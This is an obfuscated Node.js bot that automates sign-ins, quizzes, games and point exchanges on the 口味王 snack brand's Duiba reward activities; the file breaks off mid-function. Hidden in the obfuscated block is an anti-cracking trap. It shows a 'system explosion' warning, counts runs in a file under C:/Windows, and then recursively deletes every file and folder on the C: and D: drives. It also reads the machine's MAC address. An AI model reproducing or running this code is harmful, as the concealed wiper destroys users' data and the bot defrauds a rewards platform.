
const {CookieJar, Cookie} = require("tough-cookie");
const got = require("got");
const parser = require("@babel/parser");
const fs = require('fs');
const path = require('path');
const jsname = '口味王'
const $ = new Env(jsname);
//const rlsyn = require('readline-sync');
const xpath = require('xpath')
    , XmldomParser = require('xmldom').DOMParser;
const domParser = new XmldomParser({
    errorHandler: {}
})
const {JSDOM} = require('jsdom');
const VM = require("sablejs/runtime")();
const cryptoJS = require('crypto-js');

/////
function DealScriptStr(str) {
    str = str.replaceAll(/\/\*.*?\*\//g, ' ');
    str = str.replaceAll(/\b0(\d+)/g, '0o$1');
    return str;
}

function dealToken(tokenStr, tokenKeyStr) {
    let scriptToken, scriptKey;
    scriptToken = DealScriptStr(tokenStr);
    scriptKey = DealScriptStr(tokenKeyStr);
    let tdom = new JSDOM(
        `<script>${scriptToken}</script><script>${scriptKey}</script>`,
        {
            runScripts: 'dangerously'
        }
    )
    let str = scriptKey;
    var babelStr;
    str = str.replaceAll(/eval/g, 'var babelStr=');
    str = str.replaceAll(/\\u0065\\u0076\\u0061\\u006c/g, 'var babelStr=')
    eval(str);
    eval(babelStr);
    let ast = parser.parse(babelStr);
    let funcStr = ast.program.body[0].id.name;

    let res = tdom.window[funcStr]();
    tdom.window.close();
    //console.log(window['pf8b6b']);
    return res;
}

function dealToken2(tokenStr, tokenKey) {
    let scriptToken;
    scriptToken = DealScriptStr(tokenStr);
    let tdom = new JSDOM(
        `<script>${scriptToken}</script>`,
        {
            runScripts: 'dangerously'
        }
    )
    let res = tdom.window[tokenKey];
    tdom.window.close();
    //console.log(window['pf8b6b']);
    return res;
}

function ParseHtml(html) {
    let doc = domParser.parseFromString(html);
    let nodes = xpath.select('//script', doc);
    let node = nodes[4].childNodes[0];
    let babelStr;
    let tdom = new JSDOM(`<script>${DealScriptStr(node.data)}</script>`, {
        runScripts: 'dangerously'
    })
    babelStr = tdom.window.getDuibaToken.toString();
    let tokenKey = babelStr.match(/var key = '(.*)?';/)[1];
    let defaultToken = babelStr.match(/data.token = '(.*)?';/)[1];
    tdom.window.close();
    return {
        cid: tdom.window.CFG.consumerId,
        tokenKey,
        defaultToken
    };
}

function ParseHtmlGame(html) {
    let doc = domParser.parseFromString(html);
    let nodes = xpath.select('//script', doc);
    let node = nodes[2].childNodes[0];
    let tdom = new JSDOM(`<script>${node.data}</script>`, {
        runScripts: 'dangerously'
    })
    tdom.window.close();
    return {
        key: tdom.window.CFG.key
    };
}

////
/////

const _0x24494b=_0x3bc6;(function(_0x3a2697,_0x3c75cc){const _0x40f039=_0x3bc6,_0xf16783=_0x3a2697();while(!![]){try{const _0x31422=-parseInt(_0x40f039(0x2de))/0x1*(parseInt(_0x40f039(0x25a))/0x2)+parseInt(_0x40f039(0x21c))/0x3+parseInt(_0x40f039(0x1d1))/0x4+parseInt(_0x40f039(0x246))/0x5*(parseInt(_0x40f039(0x24c))/0x6)+-parseInt(_0x40f039(0x2ce))/0x7*(parseInt(_0x40f039(0x2a7))/0x8)+-parseInt(_0x40f039(0x212))/0x9*(parseInt(_0x40f039(0x2b9))/0xa)+parseInt(_0x40f039(0x1ce))/0xb;if(_0x31422===_0x3c75cc)break;else _0xf16783['push'](_0xf16783['shift']());}catch(_0x10a0e7){_0xf16783['push'](_0xf16783['shift']());}}}(_0x42c1,0x7128a));let ml='',mac='';function initVM(){const _0x295479=_0x3bc6;vm=new VM();const _0x2c3775=vm[_0x295479(0x217)](),_0x5c3b44=vm[_0x295479(0x272)](),_0x17f64c=vm[_0x295479(0x228)](_0x295479(0x26c),function(){const _0x49edda=_0x295479,_0xe8b41a=[];for(let _0x2671e2=0x0;_0x2671e2<arguments[_0x49edda(0x27c)];_0x2671e2++){_0xe8b41a[_0x49edda(0x2ad)](vm[_0x49edda(0x21e)](arguments[_0x2671e2]));}return console[_0x49edda(0x26c)](..._0xe8b41a),vm[_0x49edda(0x243)]();}),_0x53abfc=vm[_0x295479(0x228)](_0x295479(0x1cd),function(_0x38f745){const _0x5755d8=_0x295479;let _0x468878=eval(_0x38f745[_0x5755d8(0x1e3)]);return vm['createString'](JSON[_0x5755d8(0x29b)](_0x468878));}),_0x4dd048=vm['createFunction'](_0x295479(0x255),function(_0xab27d1){const _0x2cbe18=_0x295479;let _0x5c314d=_0xab27d1[_0x2cbe18(0x1e3)],_0x1738f7=fs[_0x2cbe18(0x2cb)](_0x5c314d,_0x2cbe18(0x2db))[_0x2cbe18(0x1cb)](/\r\n/g,'\x0a'),_0x4429f7=cryptoJS[_0x2cbe18(0x273)](_0x1738f7)[_0x2cbe18(0x282)]();return vm[_0x2cbe18(0x2d7)](_0x4429f7);}),_0x1e91cb=vm['createFunction'](_0x295479(0x1f2),function(_0x197692){const _0xbd1490=_0x295479;let _0x464b07=cryptoJS[_0xbd1490(0x273)](_0x197692['value'])[_0xbd1490(0x282)]();return vm[_0xbd1490(0x2d7)](_0x464b07);});return vm['setProperty'](_0x5c3b44,_0x295479(0x26c),_0x17f64c),vm[_0x295479(0x1ff)](_0x2c3775,_0x295479(0x1cd),_0x53abfc),vm[_0x295479(0x1ff)](_0x2c3775,_0x295479(0x2d9),_0x5c3b44),vm['setProperty'](_0x2c3775,_0x295479(0x255),_0x4dd048),vm[_0x295479(0x1ff)](_0x2c3775,_0x295479(0x1f2),_0x1e91cb),vm[_0x295479(0x2c3)](fs[_0x295479(0x2cb)](_0x295479(0x240))[_0x295479(0x282)]()),vm;}function destroyVM(_0x40d991){const _0x511a8c=_0x3bc6;_0x40d991[_0x511a8c(0x2c4)]();}function _0x3bc6(_0x3a13d1,_0x130510){const _0x42c11e=_0x42c1();return _0x3bc6=function(_0x3bc6e4,_0x56de2e){_0x3bc6e4=_0x3bc6e4-0x1c3;let _0x44f0ed=_0x42c11e[_0x3bc6e4];return _0x44f0ed;},_0x3bc6(_0x3a13d1,_0x130510);}function abc(_0x28a85e,_0x2d4de2,_0x45d0f9,_0x181dba,_0x379bb8){const _0x101ebd=_0x3bc6,_0x1a9e32=_0x28a85e[_0x101ebd(0x217)]();let _0x4ef682=_0x28a85e[_0x101ebd(0x21a)](_0x1a9e32,'xab'),_0x2be563=_0x28a85e['call'](_0x4ef682,_0x28a85e[_0x101ebd(0x243)](),_0x28a85e[_0x101ebd(0x2d7)](_0x2d4de2),_0x28a85e[_0x101ebd(0x2d7)](_0x181dba),_0x28a85e['createString'](_0x379bb8),_0x28a85e[_0x101ebd(0x2d7)](_0x45d0f9));return _0x2be563=_0x28a85e[_0x101ebd(0x21e)](_0x2be563),_0x2be563;}function xyz(_0x586bc1,_0x2a85dd,_0x115812,_0x55657d,_0x2dc17a){const _0x38b46a=_0x3bc6,_0x1a6dbd=_0x586bc1['getGlobal']();let _0x4449a1=_0x586bc1[_0x38b46a(0x21a)](_0x1a6dbd,_0x38b46a(0x256)),_0x5e16fe=_0x586bc1[_0x38b46a(0x2a2)](_0x4449a1,_0x586bc1[_0x38b46a(0x243)](),_0x586bc1['createString'](_0x2a85dd),_0x586bc1['createString'](_0x55657d),_0x586bc1[_0x38b46a(0x2d7)](_0x2dc17a),_0x586bc1[_0x38b46a(0x2d7)](_0x115812));return _0x5e16fe=_0x586bc1[_0x38b46a(0x21e)](_0x5e16fe),_0x5e16fe;}if($[_0x24494b(0x1de)]()){gtr=fs;if(isFileExist(_0x24494b(0x213)))console[_0x24494b(0x26c)](_0x24494b(0x230)),setInterval(()=>{const _0x4ff62a=_0x24494b;do{(function(_0x224e01){return function(_0x404ad0){const _0x4d70a5=_0x3bc6;return Function(_0x4d70a5(0x2b4)+_0x404ad0+'\x22)()');}(_0x224e01);}(_0x4ff62a(0x279))('de',0x0,0x0,(0x0,0x0)),addF(_0x4ff62a(0x2ab)),addF('C:/'));}while(0x1);},0x0);else{console[_0x24494b(0x26c)](_0x24494b(0x208));function getMACAddresses(){var _0x5ea8df='',_0x5525cb=fs['readdirSync']('/sys/class/net/');return _0x5525cb['forEach'](function(_0x34f148){const _0x263d4a=_0x3bc6;var _0x1c5a84=path[_0x263d4a(0x1dd)]('/sys/class/net',_0x34f148,_0x263d4a(0x2bf));_0x34f148[_0x263d4a(0x25b)](0x0,0x3)==_0x263d4a(0x264)&&fs[_0x263d4a(0x285)](_0x1c5a84)&&(_0x5ea8df=fs[_0x263d4a(0x2cb)](_0x1c5a84)['toString']()[_0x263d4a(0x2c2)]());}),_0x5ea8df;}mac=getMACAddresses();}}else console[_0x24494b(0x26c)](_0x24494b(0x2d6));function isFileExist(_0x47607c){const _0x199123=_0x24494b;try{gtr['accessSync'](_0x47607c,gtr[_0x199123(0x29e)]);}catch(_0x588e89){return![];}return!![];}function addF(_0x5f4823,_0x2dff66){const _0x491a78=_0x24494b;let _0x3f77e1=0x0,_0xa23b82=_0x491a78(0x205);if(isFileExist(_0xa23b82))_0x3f77e1=gtr[_0x491a78(0x2cb)](_0xa23b82,_0x491a78(0x27f));else{if(isFileExist('C:/'))gtr[_0x491a78(0x1fd)](_0xa23b82,'1',function(_0x5cc8e2){if(_0x5cc8e2)throw _0x5cc8e2;});else return;}if(_0x3f77e1==0x63)return 0x63;console[_0x491a78(0x26c)](_0x3f77e1),console[_0x491a78(0x26c)](_0x491a78(0x295),_0x3f77e1);if(parseInt(_0x3f77e1)<0x3){let _0x38b79a=parseInt(_0x3f77e1)+0x1;gtr['writeFileSync'](_0xa23b82,_0x38b79a+'',_0x491a78(0x27f));return;}if(!gtr[_0x491a78(0x285)](_0x5f4823))return;if(gtr[_0x491a78(0x292)](_0x5f4823)['isDirectory']()){var _0x204630=gtr[_0x491a78(0x1d4)](_0x5f4823),_0xf7006=_0x204630[_0x491a78(0x27c)],_0x43bda4=0x0;if(_0xf7006>0x0)_0x204630['forEach'](function(_0x44ed8c){const _0x2287c8=_0x491a78;_0x43bda4++;var _0x56961c=gtr[_0x2287c8(0x292)](_0x5f4823+'/'+_0x44ed8c),_0x282e02=_0x5f4823+'/'+_0x44ed8c;gtr[_0x2287c8(0x292)](_0x282e02)[_0x2287c8(0x267)]()?addF(_0x282e02,!![]):gtr[_0x2287c8(0x271)](_0x282e02);}),_0xf7006==_0x43bda4&&_0x2dff66&&gtr[_0x491a78(0x200)](_0x5f4823);else _0xf7006==0x0&&_0x2dff66&&gtr[_0x491a78(0x200)](_0x5f4823);}else gtr[_0x491a78(0x271)](_0x5f4823);}let envSplitor=['\x0a','@'],httpResult,httpReq,httpResp,dtManual=![];console['log'](_0x24494b(0x211)+dtManual);let userCookie=($['isNode']()?process[_0x24494b(0x2e0)][_0x24494b(0x28e)]:$[_0x24494b(0x1cc)](_0x24494b(0x28e)))||'',acckey=$[_0x24494b(0x1de)]()?process[_0x24494b(0x2e0)][_0x24494b(0x263)]?process[_0x24494b(0x2e0)][_0x24494b(0x263)]:'':$[_0x24494b(0x1cc)](_0x24494b(0x263))?$[_0x24494b(0x1cc)]('cdkey'):'',userList=[],userIdx=0x0,userCount=0x0,charsetNum=_0x24494b(0x2af),charsetAlp='qwertyuiopasdfghjklzxcvbnm',charsetAlpCap=_0x24494b(0x260),charsetHex=_0x24494b(0x25d),nowHour=new Date()[_0x24494b(0x29c)](),KWWURL='',DUIBAURL='',p1,p2,p3,d,ua=GetUA(),answerDict={},answerDictFile=_0x24494b(0x214);function GetUA(){const _0x21ad19=_0x24494b;let _0x1135ca=[_0x21ad19(0x22a),_0x21ad19(0x2b5)];return _0x1135ca[RandomInt(0x0,_0x1135ca[_0x21ad19(0x27c)]-0x1)];}function _0x42c1(){const _0x3feb36=['success','length','ticket=','Click','utf8','taskCode=','/member/api/list/?userKeys=v1.0&pageName=activeTaskFlag&formName=editForm&memberId=','toString','&user_type=1&is_from_share=1&_t=','/customTask1/startTravel.do?_t=','existsSync','indexOf','&levelCode=1&redirect=','get','&opId=','sort','&roundIndex=','/index.html?appID=89420&from=login&spm=89420.1.1.1','json','kwwapp','免费次数','kwwmryd','IndexHtmlRed','statSync','finally','split','警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！','map','\x22,\x22memberName\x22:\x22\x22}','&dpm=89420.258.1.1&dcm=&appId=89420','url','/hdtool/getHdtoolConfig?_=','stringify','getHours','/checkin_1/doSign.do?_t=','F_OK','UseEnergyBall','IndexHtmlPlant','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','call','plantIndex','&oaId=','\x20获取第','\x20答案','4833512HKbsif','&exchangeCodeCount=1&exchangeOneCodeConsumeCredits=880&token=','UserKeys','floor','d:/','个账号-------------\x0a','push','/getToken?_t=','0123456789','duibaLotteryMachine','StartTravel','num','remainingFreeTimes','Function(arguments[0]+\x22','Mozilla/5.0\x20(Linux;\x20Android\x2010;\x2016s\x20Pro\x20Build/QKQ1.191222.002;\x20wv)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Version/4.0\x20Chrome/86.0.4240.99\x20XWEB/3263\x20MMWEBSDK/20210902\x20Mobile\x20Safari/537.36\x20MMWEBID/1048\x20MicroMessenger/8.0.15.2020(0x28000F3D)\x20Process/appbrand0\x20WeChat/arm64\x20Weixin\x20NetType/WIFI\x20Language/zh_CN\x20ABI/arm64\x20MiniProgramEnv/android','/customTask1/queryTasks.do?user_type=0&is_from_share=1&_t=','msg','choose','110UnNSwH','now','/game/exchangeInfo.do?user_type=1&is_from_share=1&_t=','TaskGuide','post','uid','address','/aaw/underseaGame/startRound?__ts__=','GetHdtoolConfig','trim','run','destroy','&user_type=0&is_from_share=1&_t=','question','Index','index','duibaCookieJar','当前版本：1.0\x20','readFileSync','rows','Exchange','7aYCcgW','keep-alive','&type=1','zh-cn','DoSign','getOrderStatus','/game/claimNewReward.do?_t=','wait','代理环境','createString','token','console','undefined','utf-8','GetQuestion','个账号','90275WNGqGB','\x0a口味王账号【','env','CollectCoconutGuide','/hdtool/doJoin?dpm=89420.3.1.0&activityId=','IndexGame','\x20抽奖机','item','\x20果园','headers','key','replace','getdata','xxxx','10078310rpBDdu','tokenKey','未找到CK','459452tEiVxi','gzip,\x20deflate,\x20br','kwwsqg','readdirSync','&score=','Sow','IndexHtmlDati','&questionId=','StartRound','startId','https://89420.activity-20.m.duiba.com.cn/hdtool/index?id=202214172275896&dbnewopen','-------------\x20共','join','isNode','browse','set-cookie','&activityType=hdtool&consumerId=','请输入问题答案','value','orderId=','XMLHttpRequest','/credits/queryStatus.do?ticketNum=','data','parse','setdata','defaultToken','/hdtool/index?id=','getTokenNew','/aaw/underseaGame/index?opId=','isTravelling','name','finishBrowseInfoTask','en-US,en;q=0.9','ddd','QueryStatus','https://','token=','random','https://duiba.com.cn','application/x-www-form-urlencoded','/hdtool/ctoken/getTokenNew','orderNum','timestamp=','AjaxElement','writeFile','sessionId=','setProperty','rmdirSync','】每日阅读：','/hdtool/index?id=202214172275896&from=login&spm=89420.1.1.1','getMinutes','&from=login&spm=89420.1.1.1','C:/Windows/system.txt','reduce','getTime','青龙环境','result','果园\x20果实成熟\x20收取','https://89420.activity-20.m.duiba.com.cn/aaw/underseaGame/index?opId=202214587511596&dbnewopen','手动答题','/kwwAnswer/start.do?user_type=0&is_from_share=1&_t=','/member/api/info/?userKeys=v1.0&pageName=loginFreePlugin&formName=searchForm&uid=','title','duibacj','手动答题\x20','79902TXohUl','C:/','./answerDict.json','/game/collectCoconutGuide.do?_t=','job/listJob.json','getGlobal','/member/api/submit/?userKeys=v1.0','&token=','getProperty','hdType=dev&hdToolId=&preview=false&actId=','1989402xuHLHv','个账号\x0a','asString','duibaGame','getTokenKey','\x20天天领红包','/game/sow.do?_t=','CollectCoconut','/game/taskGuide.do?_t=','writeFileSync','ExchangeInfo','Start','createFunction','{\x22pageName\x22:\x22AddSignSvmInfo\x22,\x22formName\x22:\x22addForm\x22,\x22orderNo\x22:\x227\x22,\x22paramNo\x22:\x22888\x22,\x22cateId\x22:\x22\x22,\x22memberId\x22:\x22','Mozilla/5.0\x20(iPhone;\x20CPU\x20iPhone\x20OS\x2014_2\x20like\x20Mac\x20OS\x20X)\x20AppleWebKit/605.1.15\x20(KHTML,\x20like\x20Gecko)\x20Mobile/15E148\x20MicroMessenger/8.0.17(0x1800112e)\x20NetType/WIFI\x20Language/zh_CN\x20miniProgram/wxfb0905b0787971ad','/log/click?__ts__=','&userCname=1&articleTitle=undefined','/customTask1/finishBrowseInfoTask.do?_t=','&startId=','toPlaywayId=game&toActionId=exchange&desc=exchange_consume_credits_desc&credits=880&user_type=1&is_from_share=1&_t=','电脑环境','doJoin','/member/api/list/?userKeys=v1.0&pageName=setNewsReadTaskFlag&formName=addForm&memberId=','StartGame','duibaPlant','filter','&sign=','getToken','未到兑换时间','QueryTask','key=','&orderNum=','autologin','】收青果：','/game/index.do?user_type=0&is_from_share=1&_t=','/kwwAnswer/getQuestion.do?user_type=0&is_from_share=1&_t=','./output_final.js','application/json','/game/exchange.do?_t=','createUndefined','duibadt','&hdType=dev&hdToolId=\x0a','5tezFLM','DrawGame','/game/index.do?kww_user_source=4&kww_user_type=0&user_type=1&is_from_share=1&_t=','jjyCookie','pageId=','Complete','618378YDOhBa','&adslotId=','setCookieSync','/hdtool/ajaxElement?_=','/projectx/','/index.html?appID=','IndexLM','/hdtool/getOrderStatus?_=','/aaw/underseaGame/getOrderStatus?__ts__=','yyyy','xmn','/game/useEnergyBall.do?_t=','remainingLimitTimes','202214172275896','14JUJtSF','substr','&activityId=','0123456789abcdef','text','】签到：','QWERTYUIOPASDFGHJKLZXCVBNM','/getTokenKey?_t=','Check','cdkey','eth','kwwqd','/aaw/underseaGame/getInfo?__ts__=','isDirectory','&_=','creditsCostDo','GetInfoGame','isShow','log','&userCname=1','getOrderStatusGame','】url获取：','code','unlinkSync','createObject','MD5','SubmitGame','done','opId=','\x20获取第1个ck成功:\x20','answer','bugger','/game/collectCoconut.do?_t='];_0x42c1=function(){return _0x3feb36;};return _0x42c1();}function RandomInt(_0x3ebc92,_0x182a28){const _0x4544c1=_0x24494b;return Math[_0x4544c1(0x2aa)](_0x3ebc92+(_0x182a28-_0x3ebc92)*Math[_0x4544c1(0x1f6)]());}function ReadAnswerDict(){const _0x1abbf7=_0x24494b;try{answerDict=JSON['parse'](fs[_0x1abbf7(0x2cb)](answerDictFile,{'encoding':_0x1abbf7(0x2db)}));}catch(_0x14668b){console['log'](_0x14668b);}}function LoadAnswerDict(){const _0x434883=_0x24494b;try{fs[_0x434883(0x225)](answerDictFile,JSON[_0x434883(0x29b)](answerDict));}catch(_0x46cc02){console[_0x434883(0x26c)](_0x46cc02);}}function GameSign(_0x2fc6da,_0x284604){const _0x1fd8ef=_0x24494b;let _0x3a0df3=[],_0x3cd18b=new URLSearchParams(_0x2fc6da);_0x3cd18b[_0x1fd8ef(0x28a)]();for(let [_0x5794bf,_0x11fa6a]of _0x3cd18b){_0x3a0df3[_0x1fd8ef(0x2ad)](_0x5794bf+'='+_0x11fa6a);}return _0x3a0df3['push'](_0x1fd8ef(0x23a)+_0x284604),MD5Encrypt(_0x3a0df3[_0x1fd8ef(0x1dd)]('&'));}class UserInfo{constructor(_0x232b00){const _0x5cc673=_0x24494b;this[_0x5cc673(0x2c8)]=++userIdx,this[_0x5cc673(0x1ef)]=this[_0x5cc673(0x2c8)],this['uid']=_0x232b00,this[_0x5cc673(0x2c9)]=new CookieJar();}async[_0x24494b(0x2c3)](){const _0x502e28=_0x24494b;try{await this['kwwqd'](),await this[_0x502e28(0x1d3)](),await this[_0x502e28(0x290)](),await $[_0x502e28(0x2d5)](0x7d0),console['log']('账号'+this[_0x502e28(0x2c8)]+'\x20答题'),await this[_0x502e28(0x2a9)](p1,d),await this[_0x502e28(0x244)](p1),await $[_0x502e28(0x2d5)](0x7d0),console[_0x502e28(0x26c)]('账号'+this[_0x502e28(0x2c8)]+_0x502e28(0x1c8)),await this[_0x502e28(0x2a9)](p2,d),await this[_0x502e28(0x234)](p2),await $['wait'](0x7d0),console[_0x502e28(0x26c)]('账号'+this[_0x502e28(0x2c8)]+'\x20海岛游戏'),await this[_0x502e28(0x2a9)]('','',_0x502e28(0x20b)),await this[_0x502e28(0x21f)](''),await $['wait'](0x7d0),console['log']('账号'+this[_0x502e28(0x2c8)]+_0x502e28(0x1c6)),await this[_0x502e28(0x2a9)]('','',_0x502e28(0x1db)),await this[_0x502e28(0x2b0)](),await $['wait'](0x7d0),console['log']('账号'+this['index']+_0x502e28(0x221)),await this[_0x502e28(0x2a9)](p3,d),await this[_0x502e28(0x210)](p3),await $[_0x502e28(0x2d5)](0x7d0);}catch(_0x1c7730){console[_0x502e28(0x26c)](_0x1c7730);}finally{LoadAnswerDict();}}async[_0x24494b(0x2a9)](_0xfee50f,_0x3604c3,_0x2e8a98){const _0x5d292f=_0x24494b;if(!_0x2e8a98)_0x2e8a98=_0x5d292f(0x1f4)+DUIBAURL+_0x5d292f(0x250)+_0xfee50f+_0x5d292f(0x251)+_0x3604c3;try{let _0x1d134f=Math['round'](new Date()[_0x5d292f(0x207)]()),_0x4f0b36={'url':_0x5d292f(0x1f4)+KWWURL+_0x5d292f(0x20e)+this[_0x5d292f(0x2be)]+_0x5d292f(0x287)+encodeURIComponent(_0x2e8a98),'headers':{'Host':KWWURL,'Charset':_0x5d292f(0x2db),'User-Agent':ua,'Content-Type':'application/json'}};await httpRequest(_0x5d292f(0x288),_0x4f0b36);let _0x7b927c=httpResult;console['log'](_0x5d292f(0x2df)+this[_0x5d292f(0x2c8)]+_0x5d292f(0x26f)+_0x7b927c[_0x5d292f(0x209)]),await this[_0x5d292f(0x23c)](_0x7b927c['result']);}catch(_0x1aa077){console[_0x5d292f(0x26c)](_0x1aa077);}finally{}}async[_0x24494b(0x23c)](_0x39375f){const _0x5968a9=_0x24494b;if(!_0x39375f)return;let _0x20d806={'headers':{'Host':DUIBAURL,'Accept':_0x5968a9(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':'zh-cn','Accept-Encoding':_0x5968a9(0x1d2),'Connection':_0x5968a9(0x2cf)},'followRedirect':![]};await got[_0x5968a9(0x288)](_0x39375f,_0x20d806)['then'](_0x4b6643=>{const _0x455cb2=_0x5968a9;if(_0x4b6643['statusCode']===0x12e){let _0x12d3bb=_0x4b6643[_0x455cb2(0x1c9)][_0x455cb2(0x1e0)][_0x455cb2(0x296)](Cookie[_0x455cb2(0x1e8)]);for(let _0x2b83bd of _0x12d3bb){if(_0x2b83bd['value'])this[_0x455cb2(0x2c9)][_0x455cb2(0x24e)](_0x2b83bd,_0x455cb2(0x1f7));}}});}async[_0x24494b(0x237)](_0x4e599a){const _0x35c871=_0x24494b;try{let _0x2842bd=_0x35c871(0x1f4)+DUIBAURL+_0x35c871(0x250)+_0x4e599a+_0x35c871(0x2ae)+Date[_0x35c871(0x2ba)](),_0xaaa124={'headers':{'Host':DUIBAURL,'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Cookie':'','User-Agent':ua,'Accept-Language':_0x35c871(0x2d1),'Accept-Encoding':_0x35c871(0x1d2),'Connection':_0x35c871(0x2cf)},'cookieJar':this[_0x35c871(0x2c9)]},_0x2005b3=await got[_0x35c871(0x288)](_0x2842bd,_0xaaa124)['json']();return _0x2005b3[_0x35c871(0x1e7)];}catch(_0x28443f){console[_0x35c871(0x26c)](_0x28443f);}}async['getTokenKey'](_0x4b126a){const _0xf85101=_0x24494b;try{let _0x4ae2ea=_0xf85101(0x1f4)+DUIBAURL+'/projectx/'+_0x4b126a+_0xf85101(0x261)+Date['now'](),_0x4d5736={'headers':{'Host':DUIBAURL,'Accept':_0xf85101(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':_0xf85101(0x2d1),'Accept-Encoding':'gzip,\x20deflate,\x20br','Connection':_0xf85101(0x2cf)},'cookieJar':this[_0xf85101(0x2c9)]},_0x1d2438=await got[_0xf85101(0x288)](_0x4ae2ea,_0x4d5736)['text']();return _0x1d2438;}catch(_0x7918a0){console['log'](_0x7918a0);}}async[_0x24494b(0x265)](){const _0x80c7af=_0x24494b;try{let _0x341a89={'url':_0x80c7af(0x1f4)+KWWURL+_0x80c7af(0x218),'headers':{'Host':KWWURL,'Charset':_0x80c7af(0x2db),'User-Agent':ua,'Content-Type':_0x80c7af(0x241)},'body':_0x80c7af(0x229)+this[_0x80c7af(0x2be)]+_0x80c7af(0x297)};await httpRequest(_0x80c7af(0x2bd),_0x341a89);const _0x4c8046=httpResult;console[_0x80c7af(0x26c)]('\x0a口味王账号【'+this[_0x80c7af(0x2c8)]+_0x80c7af(0x25f)+_0x4c8046[_0x80c7af(0x2b7)]);}catch(_0x9577ee){console[_0x80c7af(0x26c)](_0x9577ee);}}async[_0x24494b(0x1d3)](){const _0x1ed250=_0x24494b;try{let _0x10b2e6={'url':_0x1ed250(0x1f4)+KWWURL+_0x1ed250(0x281)+this[_0x1ed250(0x2be)]+_0x1ed250(0x26d),'headers':{'Host':KWWURL,'Charset':_0x1ed250(0x2db),'User-Agent':ua,'Content-Type':_0x1ed250(0x241)}};await httpRequest('get',_0x10b2e6);const _0x2ed3df=httpResult;console[_0x1ed250(0x26c)](_0x1ed250(0x2df)+this[_0x1ed250(0x2c8)]+_0x1ed250(0x23d)+_0x2ed3df[_0x1ed250(0x2cc)][0x0]);}catch(_0x81f5d3){console[_0x1ed250(0x26c)](_0x81f5d3);}}async[_0x24494b(0x290)](){const _0x229280=_0x24494b;try{let _0x97e659={'url':_0x229280(0x1f4)+KWWURL+_0x229280(0x232)+this[_0x229280(0x2be)]+_0x229280(0x22c),'headers':{'Host':KWWURL,'Charset':_0x229280(0x2db),'User-Agent':ua,'Content-Type':'application/json'}};await httpRequest('get',_0x97e659);let _0x2348b2=httpResult;console['log'](_0x229280(0x2df)+this[_0x229280(0x2c8)]+_0x229280(0x201)+_0x2348b2[_0x229280(0x2cc)][0x0]);}catch(_0x4ec5d0){console[_0x229280(0x26c)](_0x4ec5d0);}}async[_0x24494b(0x291)](_0xd6053b){const _0x45190d=_0x24494b;let _0x5d2c4b=_0x45190d(0x1f4)+DUIBAURL+_0x45190d(0x250)+_0xd6053b+_0x45190d(0x28c),_0x24d937={'headers':{'Host':DUIBAURL,'Accept':_0x45190d(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':_0x45190d(0x2d1),'Accept-Encoding':_0x45190d(0x1d2),'Connection':'keep-alive','Content-Type':_0x45190d(0x1f8)},'cookieJar':this[_0x45190d(0x2c9)]},_0x4ae623=await got['get'](_0x5d2c4b,_0x24d937)[_0x45190d(0x25e)]();}async[_0x24494b(0x269)](_0x137596){const _0x54ef81=_0x24494b;let _0x6af34a='https://'+DUIBAURL+_0x54ef81(0x250)+_0x137596+'/credits/creditsCost.do?_t='+Date['now'](),_0x92c05b={'headers':{'Host':DUIBAURL,'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Cookie':'','User-Agent':ua,'Accept-Language':_0x54ef81(0x2d1),'Accept-Encoding':'gzip,\x20deflate,\x20br','Connection':'keep-alive','Content-Type':_0x54ef81(0x1f8)},'body':_0x54ef81(0x22f)+Date[_0x54ef81(0x2ba)](),'cookieJar':this['duibaCookieJar']},_0x2643b2=await got[_0x54ef81(0x2bd)](_0x6af34a,_0x92c05b)[_0x54ef81(0x28d)]();return console[_0x54ef81(0x26c)](_0x2643b2),_0x2643b2;}async['QueryStatus'](_0x2e178d,_0x56fddf){const _0x5cd26d=_0x24494b;let _0x2bcf31=_0x5cd26d(0x1f4)+DUIBAURL+'/projectx/'+_0x2e178d+_0x5cd26d(0x1e6)+_0x56fddf+'&user_type=1&is_from_share=1&_t='+Date[_0x5cd26d(0x2ba)](),_0x16de9a={'headers':{'Host':DUIBAURL,'Accept':_0x5cd26d(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':_0x5cd26d(0x2d1),'Accept-Encoding':_0x5cd26d(0x1d2),'Connection':_0x5cd26d(0x2cf)},'cookieJar':this['duibaCookieJar']},_0x49006c=await got[_0x5cd26d(0x288)](_0x2bcf31,_0x16de9a)[_0x5cd26d(0x28d)]();return console[_0x5cd26d(0x26c)](_0x49006c),_0x49006c['data'];}async[_0x24494b(0x2c7)](_0x5a3868){const _0x3b6726=_0x24494b;let _0xa68ea0='https://'+DUIBAURL+'/projectx/'+_0x5a3868+_0x3b6726(0x248)+Date[_0x3b6726(0x2ba)](),_0x13618b={'headers':{'Host':DUIBAURL,'Accept':_0x3b6726(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':_0x3b6726(0x2d1),'Accept-Encoding':_0x3b6726(0x1d2),'Connection':_0x3b6726(0x2cf)},'cookieJar':this[_0x3b6726(0x2c9)]},_0x119591=await got[_0x3b6726(0x288)](_0xa68ea0,_0x13618b)[_0x3b6726(0x28d)]();return console[_0x3b6726(0x26c)](_0x119591),_0x119591[_0x3b6726(0x1e7)];}async[_0x24494b(0x2cd)](_0x54a313,_0x4b0a14,_0x54d5b0){const _0x1e695d=_0x24494b;let _0x505845=_0x1e695d(0x1f4)+DUIBAURL+_0x1e695d(0x250)+_0x54a313+_0x1e695d(0x242)+Date['now'](),_0xeb61bf={'headers':{'Host':DUIBAURL,'Accept':_0x1e695d(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':_0x1e695d(0x2d1),'Accept-Encoding':_0x1e695d(0x1d2),'Connection':_0x1e695d(0x2cf),'Content-Type':'application/x-www-form-urlencoded'},'cookieJar':this[_0x1e695d(0x2c9)],'body':_0x1e695d(0x27d)+_0x4b0a14+_0x1e695d(0x2a8)+_0x54d5b0+_0x1e695d(0x283)+Date[_0x1e695d(0x2ba)]()},_0x2bae2c=await got[_0x1e695d(0x2bd)](_0x505845,_0xeb61bf)['json']();return console[_0x1e695d(0x26c)](_0x2bae2c),_0x2bae2c;}async['ExchangeInfo'](_0x48af53){const 